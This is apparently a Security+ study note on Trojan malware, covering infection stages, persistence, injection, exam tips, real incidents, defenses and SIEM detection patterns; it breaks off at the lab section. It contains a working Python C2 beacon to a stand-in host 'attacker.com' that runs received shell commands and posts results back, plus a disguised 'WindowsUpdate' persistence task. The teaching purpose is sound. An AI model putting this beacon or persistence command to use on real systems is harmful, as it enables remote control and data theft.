---
domain: "cybersecurity/attack"
tags: [malware, trojan, remote-access, persistence, social-engineering]
---
# Trojan

A **Trojan** (formally **Trojan horse**) is a type of [[Malware]] that disguises itself as legitimate software to deceive users into executing it, while secretly performing malicious actions in the background. Named after the Greek mythological stratagem, Trojans rely on [[Social Engineering]] rather than self-replication to spread, distinguishing them from [[Virus]] and [[Worm]] malware. They form the foundation of many advanced attack campaigns, often serving as the initial foothold for [[Ransomware]] deployment, data exfiltration, or persistent [[Backdoor]] access.

---

## Overview

Trojans represent one of the oldest and most prevalent categories of malware, with documented specimens dating to the 1970s and 1980s—the infamous **AIDS Trojan** (1989) being among the first widely distributed examples. Unlike viruses, which attach themselves to clean files and replicate, or worms, which spread autonomously across networks, Trojans depend entirely on the victim willingly executing the malicious payload. This deception is central to their design: they are packaged to appear as game cracks, software activators, PDF readers, system utilities, or even fake antivirus tools.

Once executed, a Trojan typically drops or unpacks a secondary payload, establishes persistence mechanisms, and communicates with attacker-controlled infrastructure. The **command-and-control (C2)** channel is the lifeline of most modern Trojans—allowing operators to issue commands, exfiltrate data, download additional modules, and maintain interactive sessions with compromised hosts. Modern Trojans frequently use encrypted protocols over common ports (443, 80) to blend with legitimate traffic and evade [[Network Intrusion Detection System (NIDS)]] signatures.

Trojans are categorized by their primary function: **Remote Access Trojans (RATs)** provide full interactive control over a victim machine; **banking Trojans** (e.g., Zeus, Emotet, TrickBot) target financial credentials; **downloader Trojans** fetch and execute secondary payloads; **rootkit Trojans** embed deeply into the OS to hide their presence; and **destructive Trojans** damage or encrypt files. Many high-profile breaches—including the Target breach of 2013 and the widespread Emotet campaigns of 2018–2021—involved Trojans as the initial infection vector.

The threat landscape has evolved significantly with **Trojan-as-a-Service** offerings on dark web forums, where actors can purchase pre-built RAT builders, bulletproof hosting for C2 servers, and obfuscation services. This commoditization has lowered the technical bar for attackers, making Trojans a persistent and widespread threat to enterprises and individuals alike. Nation-state actors also leverage sophisticated Trojans—APT groups have deployed tools like FinFisher (FinSpy), Poison Ivy, and PlugX in targeted espionage campaigns spanning decades.

---

## How It Works

### Infection Chain

The typical Trojan infection follows a multi-stage process:

**Stage 1 – Delivery**
The Trojan is delivered through a deceptive vector. Common delivery methods include:
- Phishing emails with malicious attachments (`.docx` with macros, `.pdf` with embedded scripts, `.iso` files)
- Malicious download sites masquerading as software crack or keygen distributors
- Trojanized legitimate software packages uploaded to unofficial repositories
- Drive-by downloads exploiting browser vulnerabilities via [[Exploit Kit]]s

**Stage 2 – Execution**
The victim executes the file, which launches the dropper. The dropper typically:
1. Extracts the embedded payload from encrypted or compressed resources within the binary
2. Writes the payload to disk (e.g., `%APPDATA%\Microsoft\Windows\malware.exe`) or injects it directly into memory
3. Executes the payload via `CreateProcess`, `ShellExecute`, or process injection techniques

**Stage 3 – Persistence**
Trojans establish persistence so they survive reboots. Common mechanisms:

```
# Registry Run key persistence
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Scheduled Task creation via schtasks
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\user\AppData\Roaming\svchost.exe" /sc onlogon /ru SYSTEM

# Startup folder drop
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

**Stage 4 – C2 Beacon**
The payload initiates communication with the attacker's C2 server:

```python
# Simplified HTTP-based C2 beacon logic (conceptual)
import requests, time, subprocess, base64

C2_URL = "https://attacker.com/beacon"

while True:
    r = requests.get(C2_URL, headers={"User-Agent": "Mozilla/5.0"})
    if r.status_code == 200 and r.text != "":
        cmd = base64.b64decode(r.text).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True)
        requests.post(C2_URL + "/result",
                      data=base64.b64encode(result.stdout))
    time.sleep(60)  # Beacon interval to avoid detection
```

Modern C2 frameworks (Cobalt Strike, Metasploit, Sliver) use encrypted, authenticated channels, often over HTTPS (TCP/443) or DNS tunneling to bypass [[Firewall]] rules.

**Stage 5 – Lateral Movement and Objective**
With an established foothold, the Trojan operator may:
- Capture keystrokes, screenshots, clipboard contents
- Exfiltrate files matching specific extensions
- Dump credential hashes using tools like Mimikatz
- Pivot to internal network hosts via [[Pass-the-Hash]] or [[RDP]]
- Deploy secondary payloads (ransomware, cryptominer)

### Process Injection Techniques

Many RATs avoid writing executables to disk by injecting shellcode directly into legitimate processes:

```
# Common injection targets
svchost.exe
explorer.exe
notepad.exe

# Injection API sequence (conceptual):
1. OpenProcess()        -> obtain handle to target process
2. VirtualAllocEx()     -> allocate memory in target
3. WriteProcessMemory() -> write shellcode to allocated memory
4. CreateRemoteThread() -> execute shellcode in target context
```

This technique, known as **process hollowing** or **reflective DLL injection**, allows the malware to run under a trusted process name, defeating simple process-based allow-lists.

### Network Indicators

| Protocol | Port | Use Case |
|----------|------|----------|
| HTTPS | 443 | Encrypted C2 beacon (most common) |
| HTTP | 80 | Plaintext C2, often in older samples |
| DNS | 53 | DNS tunneling C2 (e.g., DNScat) |
| IRC | 6667 | Legacy botnets, older RATs |
| Custom TCP | Variable | Proprietary C2 protocols |

---

## Key Concepts

- **Remote Access Trojan (RAT)**: A Trojan subtype that provides the attacker with full interactive control over the victim's machine, including file system access, process management, keylogging, webcam/microphone access, and command shell. Well-known RATs include DarkComet, njRAT, AsyncRAT, and Remcos.

- **Dropper vs. Downloader**: A **dropper** contains the malicious payload embedded within itself and extracts it upon execution; a **downloader** fetches the payload from an external URL after execution. Downloaders are harder to detect at the email gateway level since the initial file appears benign.

- **Command-and-Control (C2) Infrastructure**: The attacker-operated server or network that receives beacons from infected hosts and issues commands. Modern C2 frameworks use domain fronting, fast-flux DNS, and legitimate cloud services (GitHub, Pastebin, Discord) to obscure their infrastructure.

- **Banking Trojan**: A specialized Trojan targeting online financial systems. These malware families (Zeus, Emotet, TrickBot, Dridex) use techniques like **web injection** (man-in-the-browser attacks), form grabbing, and credential harvesting to steal banking credentials and facilitate fraudulent transfers.

- **Persistence Mechanism**: Any technique used by the Trojan to survive system reboots and user logoff events. MITRE ATT&CK documents dozens of persistence techniques including registry modifications, scheduled tasks, service installation, boot/pre-OS execution, and [[DLL Search Order Hijacking]].

- **Trojanized Software**: Legitimate software that has been modified to include a malicious payload and redistributed through unofficial channels. The **SolarWinds SUNBURST** supply chain attack (2020) is a sophisticated example where the build pipeline itself was compromised to insert a Trojan into digitally signed software.

- **Living off the Land (LotL)**: A technique where Trojans abuse legitimate system tools (PowerShell, WMI, certutil, mshta) to execute payloads and communicate with C2, reducing reliance on dropped executables and evading traditional [[Antivirus]] detection.

---

## Exam Relevance

**Security+ SY0-701 Domain Mapping**: Trojans appear primarily under **Domain 2.0 – Threats, Vulnerabilities, and Mitigations**, specifically in the malware indicator and attack type sections.

**Key Exam Tips:**

- **Distinguish malware types**: The exam frequently tests your ability to differentiate Trojans (requires user execution, no self-replication) from viruses (self-replicates, attaches to files) and worms (self-propagates across networks without user interaction). If a question describes malware disguised as something legitimate, the answer is **Trojan**.

- **RAT identification**: Questions may describe symptoms like unauthorized webcam access, remote shell sessions, or keylogging from malware delivered via a fake game download—this is a RAT (a subtype of Trojan).

- **Backdoor vs. Trojan**: A **backdoor** is a mechanism for bypassing authentication; a Trojan may *install* a backdoor but is defined by its delivery method (disguise). Some questions test this subtle distinction. The Trojan is the delivery vehicle; the backdoor is the capability it installs.

- **Common gotcha**: Trojans do NOT self-replicate. If a question says the malware "spreads to other systems on the network automatically," it is more likely a worm, even if it was originally delivered disguised as legitimate software.

- **Social engineering tie-in**: Trojans are almost always paired with [[Phishing]] in exam scenarios. Recognize the social engineering component (deceptive email, fake download page) as the delivery method.

- **Indicators of Compromise (IoCs)**: Know that unusual outbound connections on port 443 to newly registered domains, unexpected scheduled tasks, and new registry Run keys are common Trojan IoCs—these can appear in scenario-based questions.

---

## Security Implications

### Real-World Incidents

**Zeus Banking Trojan (2007–present)**: One of the most prolific banking Trojans ever created, Zeus infected millions of Windows systems globally. It used form grabbing to steal credentials from banking websites, resulting in over $100 million in fraudulent transfers. Its leaked source code spawned dozens of derivatives including Citadel, SpyEye, and GameOver Zeus (used to distribute CryptoLocker ransomware).

**Emotet (2014–2021, resurgence 2022)**: Originally a banking Trojan, Emotet evolved into a sophisticated malware delivery platform (MaaS). Distributed primarily via malicious Word document macros in phishing emails, Emotet would install TrickBot or Qakbot as secondary payloads, which in turn deployed Ryuk or Conti ransomware. Europol and international law enforcement disrupted Emotet's infrastructure in January 2021 (Operation LadyBird), but variants resurged by late 2021.

**SolarWinds SUNBURST (2020)**: A nation-state supply chain attack (attributed to Russian SVR/Cozy Bear) where the SolarWinds Orion build process was compromised to distribute a Trojanized update to ~18,000 organizations. The backdoor (SUNBURST/Solorigate) used legitimate Orion API endpoints for C2, blending entirely with normal product traffic. CVE-2020-10148 documented the authentication bypass associated with this campaign.

**Relevant CVEs and Vulnerabilities:**
- **CVE-2017-0199**: Microsoft Office/WordPad RCE via crafted RTF file, heavily exploited by dropper Trojans
- **CVE-2022-30190** (Follina): MSDT remote code execution used to deliver Trojans via malicious Office documents without enabling macros

### Attack Vectors
- Email attachments exploiting macro-enabled documents
- Malicious advertising ([[Malvertising]]) redirecting to exploit kits
- Compromised software update mechanisms (supply chain)
- Piracy sites (cracks, keygens, nulled software)
- Fake browser extensions and plugin updates

---

## Defensive Measures

### Technical Controls

**Endpoint Protection:**
- Deploy a modern **Endpoint Detection and Response (EDR)** solution (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) capable of behavioral analysis, not just signature matching
- Enable **Attack Surface Reduction (ASR)** rules in Windows Defender to block Office applications from spawning child processes and creating executable content
- Implement **application allow-listing** (Windows Defender Application Control / WDAC, AppLocker) to prevent unauthorized executables from running

```powershell
# Enable key ASR rules via PowerShell (Windows Defender ATP)
Set-MpPreference -AttackSurfaceReductionRules_Ids \
  BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 `  # Block executable content from email
  D4F940AB-401B-4EFC-AADC-AD5F3C50688A `  # Block Office child processes
  3B576869-A4EC-4529-8536-B80A7769E899 `  # Block Office executable creation
  -AttackSurfaceReductionRules_Actions Enabled, Enabled, Enabled
```

**Network Controls:**
- Implement **DNS filtering** (Cisco Umbrella, Pi-hole with blocklists, NextDNS) to block connections to known C2 domains and newly registered domains
- Use **SSL/TLS inspection** at the perimeter to decrypt and inspect HTTPS traffic from internal hosts to external destinations
- Deploy **network segmentation** with [[VLAN]]s and strict firewall rules to limit lateral movement post-compromise
- Configure egress filtering to block unexpected outbound protocols (IRC, non-standard high ports)

**Email Security:**
- Enable **macro blocking** in Microsoft 365 for documents received from the internet (Office Trust Center settings or GPO)
- Deploy email security gateways (Proofpoint, Mimecast) with sandboxing to detonate attachments before delivery
- Enforce **DMARC, DKIM, and SPF** to reduce email spoofing used in phishing campaigns

**User and Identity Controls:**
- Enforce **least privilege**—standard users should not have local administrator rights, limiting Trojans' ability to install services or write to protected directories
- Implement **Multi-Factor Authentication (MFA)** to limit damage from credential harvesting Trojans
- Regular security awareness training focused on recognizing phishing and suspicious downloads

### Detection Signatures

Key behavioral indicators to monitor in a [[SIEM]]:
```
# Suspicious registry persistence
HKCU\Software\Microsoft\Windows\CurrentVersion\Run -> new entry

# Unusual parent-child process relationships
winword.exe -> cmd.exe
excel.exe -> powershell.exe
mshta.exe -> wscript.exe

# Network beacon patterns
Regular outbound HTTPS connections at fixed intervals to low-reputation domains
DNS queries to domains registered < 30 days ago
Unusually large DNS TXT record responses (DNS tunneling)
```

---

## Lab / Hands-On

### Environment Setup

> ⚠️ **Safety Notice**: All Trojan analysis must be performed in an isolated network segment with no path to production systems or the internet. Use NAT-only or host-only networking in your hypervisor.

**Recommended Lab Stack:**
- **Attacker VM**: K